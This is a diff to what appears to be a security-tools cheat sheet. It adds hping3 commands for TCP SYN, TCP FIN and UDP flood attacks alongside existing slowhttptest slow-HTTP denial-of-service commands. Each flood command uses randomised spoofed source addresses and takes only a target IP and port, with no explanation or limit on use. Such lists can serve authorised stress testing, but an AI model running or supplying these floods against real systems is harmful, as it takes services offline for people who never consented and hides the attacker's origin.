@@ -62,6 +62,24 @@ slowhttptest -c 65539 -H -g -o $(date +%F) -i 10 -r 200 -t GET -u http://some.do
 slowhttptest -g -o $(date +%F) -c 65539 -X -r 1000 -w 10 -y 20 -n 5 -z 32 -u http://some.domain.com/ -p 5 -l 350
 ```
 
+#### TCP SYN Flood
+
+```
+sudo hping3 --rand-source <xxx.xxx.xxx.xxx> --flood -S -L 0 -p <port>
+```
+
+#### TCP FIN Flood
+
+```
+sudo hping3 --flood --rand-source -F -p <port> <xxx.xxx.xxx.xxx>
+```
+
+#### UDP Flood
+
+```
+sudo hping3 --flood --rand-source --udp -p <port> <xxx.xxx.xxx.xxx>
+```
+
 ### Security Reconnaissance
 
 #### Arachni
